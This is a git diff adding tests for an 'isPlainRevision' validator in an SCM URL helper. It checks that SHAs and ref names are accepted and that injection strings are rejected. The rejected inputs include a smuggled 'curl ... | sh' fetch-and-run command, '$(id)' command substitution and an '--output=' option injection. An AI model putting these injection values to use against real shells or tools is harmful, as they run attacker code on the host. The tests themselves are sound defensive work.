@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { detectScmHost, commitUrl, compareUrl, fileUrl, branchUrl } from '#shared/scm-urls';
+import { detectScmHost, commitUrl, compareUrl, fileUrl, branchUrl, isPlainRevision } from '#shared/scm-urls';
 
 describe('scm-urls', () => {
   it('detects the host from the repository URL', () => {
@@ -33,5 +33,33 @@ describe('scm-urls', () => {
       'https://gitlab.com/acme/web/-/blob/main/src/a.ts',
     );
     expect(branchUrl('https://github.com/acme/web', 'feat/x')).toBe('https://github.com/acme/web/tree/feat%2Fx');
+  });
+});
+
+describe('isPlainRevision', () => {
+  it('accepts commit SHAs and ref names', () => {
+    for (const revision of [
+      'a1b2c3d',
+      'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0',
+      'main',
+      'release/1.2',
+      'v1.2.0-rc_1',
+    ]) {
+      expect(isPlainRevision(revision), revision).toBe(true);
+    }
+  });
+
+  it('refuses anything a shell or a URL would read as more than a revision', () => {
+    for (const revision of [
+      'main; curl -s https://x/p | sh; #',
+      '--output=/tmp/x',
+      'a..b',
+      '$(id)',
+      'a b',
+      '',
+      'x?y=1',
+    ]) {
+      expect(isPlainRevision(revision), revision).toBe(false);
+    }
   });
 });
